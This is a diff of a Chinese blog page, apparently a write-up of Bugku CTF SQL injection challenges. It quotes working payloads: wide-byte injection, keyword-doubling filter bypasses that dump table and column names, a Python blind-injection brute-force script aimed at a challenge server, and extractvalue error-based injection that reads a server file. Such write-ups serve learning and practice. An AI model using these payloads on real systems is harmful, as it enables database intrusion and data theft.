@@ -269,7 +269,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,702</span> / Reading time: <span class="post-count">7 min</span></span>
+                        <span>Word count: <span class="post-count">1,658</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -398,8 +398,8 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="Bugku-SQL注入题目总结"><a href="#Bugku-SQL注入题目总结" class="headerlink" title="Bugku SQL注入题目总结"></a>Bugku SQL注入题目总结</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>查看源码发现网页编码为gb2312，猜测考的是宽字节注入。</p>
-<p>关于宽字节注入可以参考大佬的详解：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">戳这里</a></p>
+        <h1 id="Bugku-SQL注入题目总结"><a href="#Bugku-SQL注入题目总结" class="headerlink" title="Bugku SQL注入题目总结"></a>Bugku SQL注入题目总结</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>查看源码发现网页编码为gb2312，猜测是宽字节注入。</p>
+<p>关于宽字节注入可以参考详解：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">戳这里</a></p>
 <p>果然输入<code>?id=1%df&#39;</code>出现了报错，说明已经可以注入了。<code>1%df%27</code>被转换成了<code>1運</code>，原因就是单引号前被添加了转义符<code>\</code>，即<code>%5c</code>，在这里前面的<code>%df</code>和<code>%5c</code>结合形成了汉字，导致单引号成功逃逸。下面就可以直接操作了。</p>
 <p><code>?id=1%df&#39;and version()&gt;0 --+</code>返回正确，说明数据库可能是sqlserver或者mysql</p>
 <p><code>?id=1%bf&#39; and length(user())&gt;0 --+</code>返回正确，说明存在user()函数，数据库为mysql</p>
@@ -437,13 +437,11 @@ height:50vh;
 <p><code>?id=0&#39; ununionion selselectect 1,(selselectect column_name from infoorrmation_schema.columns where table_name=&#39;flag1&#39; limit 0,1)--+</code>得字段名flag1，还有一个叫address。同理查出hint表里有id和contents字段。</p>
 <p><code>?id=0&#39; ununionion selselectect 1,(selselectect flag1 from flag1 limit 0,1)--+</code>得到<code>usOwycTju+FTUUzXosjr</code>，这个应该是第一个flag了。</p>
 <p>然后去访问address，因该会有下一关地址。<code>?id=0&#39; ununionion selselectect 1,(selselectect address from flag1 limit 0,1)--+</code>得到<code>./Once_More.php</code></p>
-<p>进入第二关，加单引号出现报错，开始注入。观察Id的回显发现union和加号都被过滤了，再试试别的关键词，sleep和substr也被过滤掉了。用ununionion后面的select也没了，换ununionion selselectect试试，这次好像没啥问题，结果不回显了。。</p>
-<p>于是到这就注不下去了（咸鱼的我），看网上大佬们写了脚本爆破，借此机会学习下。</p>
-<p>贴上大佬的脚本：</p>
+<p>进入第二关，加单引号出现报错，开始注入。观察Id的回显发现union和加号都被过滤了，再试试别的关键词，sleep和substr也被过滤掉了。用ununionion后面的select也没了，换ununionion selselectect试试，这次好像没啥问题，结果不回显了。。于是到这就注不下去了</p>
+<p>学习网上大佬的爆破脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag2</span><span class="params">()</span>:</span></span><br><span class="line">    flag =<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        temp = <span class="string">'!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'</span></span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">            url = <span class="string">"http://120.24.86.145:9004/Once_More.php?id=1'and  (select locate(binary'"</span>+str(i)+<span class="string">"',(select flag2 from flag2),"</span>+str(j)+<span class="string">"))="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">            r1 = rs.get(url)</span><br><span class="line">            <span class="comment"># print url</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                <span class="keyword">print</span> str(i)+<span class="string">" -----"</span>+str(j)</span><br><span class="line">                flag += str(i)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*] : "</span>+flag</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> key ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>加点东西然后运行一下得到最终的flag</p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>附报错注入相关知识的连接：<a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">戳这里</a>，<a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">这个也不错</a>，<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">还有这个</a></p>
-<p>这题链接打不开了，用别人的解题思路总结一下</p>
 <p>题目提示不可以包含’’–’’，空格，单引号，双引号，’’union’’关键字。这里可以用换行符替换空格。</p>
 <p>通过extractvalue报错 <code>?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(select%0A@@version),0x7e))</code>成功报错</p>
 <p>题目要求读文件双引号里面的内容（即flag），需要查询的文件路径为<code>/var/test/key_1.php</code>，文件名转十六进制表示<code>0x2f7661722f746573742f6b65795f312e706870</code></p>
@@ -703,6 +701,16 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 12
@@ -806,9 +814,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="BugkuCTF"><span class="iconfont-archer">&#xe606;</span>BugkuCTF</span>
     
-        <span class="sidebar-tag-name" data-tags="Ajax"><span class="iconfont-archer">&#xe606;</span>Ajax</span>
-    
         <span class="sidebar-tag-name" data-tags="Life"><span class="iconfont-archer">&#xe606;</span>Life</span>
+    
+        <span class="sidebar-tag-name" data-tags="Ajax"><span class="iconfont-archer">&#xe606;</span>Ajax</span>
     
         <span class="sidebar-tag-name" data-tags="Node.js"><span class="iconfont-archer">&#xe606;</span>Node.js</span>
     
